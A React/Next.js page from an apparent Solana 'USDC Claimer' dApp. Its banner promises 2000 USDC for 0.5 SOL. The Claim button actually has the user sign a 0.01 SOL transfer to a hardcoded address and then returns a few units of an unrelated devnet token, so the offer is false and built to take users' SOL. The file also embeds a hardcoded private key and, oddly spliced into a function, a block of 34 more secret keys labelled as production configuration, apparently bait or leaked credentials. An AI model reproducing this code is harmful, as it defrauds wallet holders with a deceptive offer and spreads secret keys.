/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5LFixhf9YgWuJv2rrg6vsMVvm9kFchqZEEQ8CeHWT9gL9P3AVMLu2WBc1ckKFZSJQ8qPfUpUj2cmqtpYcHjh2KqY"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2fCHduTFi38CfkEVRMJdtbeZDkR3hu5DZpCJYRswYgE8ttE1iWaUiRZNJAJDJiAb2B1vBhtwRyPUTAFLAAwJCXcq",
  "key1": "3JDQgZK5hXrtJ75u4rcvf4cEUZ65PqQ7wxzbKc2gDBErdfp9cVcbv3ffHgFvETqBu4BFpV7i3fFDP1XbzZ9mcsFr",
  "key2": "3f1f1Kt1rSJZjLjb4iXLU643Dy3BbSmnAtwG68ruU82nawoNHg1nGQgoTXX5DX8hRzafhUB1mZXf3h2RLRApaAqQ",
  "key3": "42g6E9rApob9c9trzULkudR1XiB79afk1T33EEV61UtXkTgWVHnXZ1mTs6GPncXZuje56i9sXkCZkRjkGAmxcVor",
  "key4": "jCpPyAm755Bt5LTGj7m5fKtD9coZzBw6nTsNd6jj4DassARFy8rYf6JUJ9QPBoBEbuF8SZ7LziktXwAoJmagvec",
  "key5": "3aFPbWRj7c2Dw1uxFChBWnwbcKPryDMjxY8dYawfB4sKJwJ3U1Wi4vJQNXq2RKx1GVvFeW1RMVkeRTbpdK2dT9WZ",
  "key6": "4CzQJjHjD9bMCfGiryeK4dxCETqaY5vXPoMm5gpPznrrkaVU1kPuzZnbtNTfVySW5wvHnV7sQyLCQBQHo5Ne1u4h",
  "key7": "SEidPhd4PMZ6bKdGe2FyYVCpW2ksyq25tA2gse67v9d6ZXSk7YGe8s8NyVwjNcYJbUQ27YkUtegVcAHMnwkNNQY",
  "key8": "3jiRXeR4iUVCdjtxryMyNWC5UoiuaUQJpHxHkeZqr9qtKpWK46cAfV1YNRkiHTAZp76cGBaSF8YhoyvuS8FhNXgT",
  "key9": "4yCsqKdo5HEY3ManwthYbc6gWXDb9WVyWpwMDpFnLBa1WUaJPUpx89PwKZpUm2jGxqJ6KPYx5D2M4mNgzPuXbWei",
  "key10": "2S4TCh1TPF1zeft1z4ezsi2vFqcUyMUXsLyUvPAqErfnwaxAbARdVTNW6QH6a37D5xXmWuebJKy8rz6ZE3kberdM",
  "key11": "4LJtA5ys8vqv5rVak1kH6GSoUJPg54mvpNNE5FPrP4PmJupaKnHYxY37v4Rouyagfr8KFaLfRM2xkFQKT4en3hGN",
  "key12": "65qaGu3U3FqfYSiB2xZcsAELMBBKT6izYhACBQujJg87vUspVBM68oZugLhVkcchrVhCGViYx7i6tzoUx8RYjE6H",
  "key13": "3zZb6Qn9qEkPniqHPQA2GjNjwE3mENxo5JuG4LiQm5KgjMjSRJtWkg3LFB8cxRqrsKjzbevf9CKJqBkMpJawo4jd",
  "key14": "2434QeRCTdZ47MnuW5wyMVXPWPx9LKLqjojcBToc4uunCPdSAUsksPXCScJeraYaSNPhuXzXJNXdYtsVVdDgYkDa",
  "key15": "4GTFSY2WQQf6rX9WuZU7vWDSE4LmjmUyZcG9m1VSvJp8VqWb44tXPLhLmDtV5akLqwkqJ2bVSTEHuokFEFj64f6U",
  "key16": "3uFK9aW53ChST6DBWSDQMxx8a2N1XqCg9EJAd8amTfkcjVnaVqBsuPJjySi5YvNTwPXJedbhn4F73LQBt7nZTbBM",
  "key17": "53wGarPiBHduWefCGCLjpNf9fYgXztkpdLj78mumhoCAybMYkwL7KDjxvzgMzK1xV2Zfuv7SMSYzVYRpMqssD54X",
  "key18": "owgrBnh34K8GXGxN8wLUKBKxREMCvGarEr4tm28ugSV36y8kz3RihhdLQ5WbCExDJkjSQsQYfbMpXiBocnwo3vN",
  "key19": "UwXCWdbXHC3atFEWsK9GAWbUN9GjoHwPNwsnadjqSWzdP5MD8iWTQiFgT5V6oZV7xrqMjCS4uXUPPcPcVRJrwaW",
  "key20": "2GUaXTnzA49kU6cNY1UtgtBankqmmWc1cHWbM9tCs4R76CpBw9uXkzhDe5zocEEpMxXTv87EKEn9c8SMKJ9WYbU9",
  "key21": "63kiJoH54fzRWJ3U6eVbuuk6yuXiTizq428jaJ5orH2wMW93239BDtisq7yvrzEMz6MtrVFE3cHokUnThAFC9LPC",
  "key22": "3wp4JkGAHYTVpH7DMTFizZcKgh6NXskHRwiUeTrSQXVQASr1zRBCBTBLNZnSzLtnEeK3D8K2zerwBfpWrM3hcZjh",
  "key23": "2SkMFsYSR7EckaLxq9n829iwJ3UJeS2VSJcW2xqZfVvwQUP9CUXvyK7HsTZRRCd5dWW6PMhrALkZF2M4oaM3WxTA",
  "key24": "umrUMCPtMu9XwusWJhhvpdbCLe4AuZCRGzmyRTN7S4WYZh2HrNxJSoFNwu5k9hEBqnSbcvFrYWE6AVbFrpowUWG",
  "key25": "VNJAtuozWEyZPi968ukHH4RKQ7mvqETTgZSFP5qQ6YF6LaZFUn7UR1B6CPNsqSTqyC6tpid44S5BvXyNxoFHG2k",
  "key26": "5HD8qtyr1igpZ4BWPZfTL97BzhpmyXco88V7aqgRaRBucT71NyomzC7f3fPycgbTMx3StBUgpBRXPygmuhWgucnE",
  "key27": "48tJWZ11cChUotMQZCXLDGwo4GXsnayLMmDS6L1h3WhgfZpwEUE6TTpr31uCNF914eJy8awr8zP71EycBqjnKWsM",
  "key28": "4bYB9d5Cj6mAth9UyrtxiiT48rpokLXrQJX7dLNCAZzF44h3aNh2swNUo1fzR9GDeBz1hWgbdtSV6LMbLuaMpazN",
  "key29": "2PQfW6LD79PPncx5eJZD4Z6HsN93gtfUCU6FpK4dZoEGk8FakjzW8pGQXdx3SXft8tcfLzdV6wjhLcT8oFUJfPHz",
  "key30": "4A12pCvPCUsjrw38hvCto84f8dZwoMkAMyRahQtSupAiEXvVXfXcrVjBzWBQn8Nf3TiuZHphL2vd3BhubpBghmS2",
  "key31": "3bHjVsRZCbWPX7A1zPPA93QaizAhw2r9X7xJkbXmQ1MaQ6K9pcAVJRZvPqfUi6BrU2NKTvsWaYMiwfkSMmPUthLr",
  "key32": "611UHoXBfE5JXcLepNBjThpVmzLc74C7rKjeVhGyXrkwPUmHpK5ahJ3GXa2sUuz7jE6aLLnegdHansqwhV6MSseU",
  "key33": "3EHZpSmYZzhM9X5bfeZnKVmz1T7hyZ8KkKjrcg376d35xBVuNNwQ34pzvyHPgQkNXhUWf9uecu886m2Utsak141k"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
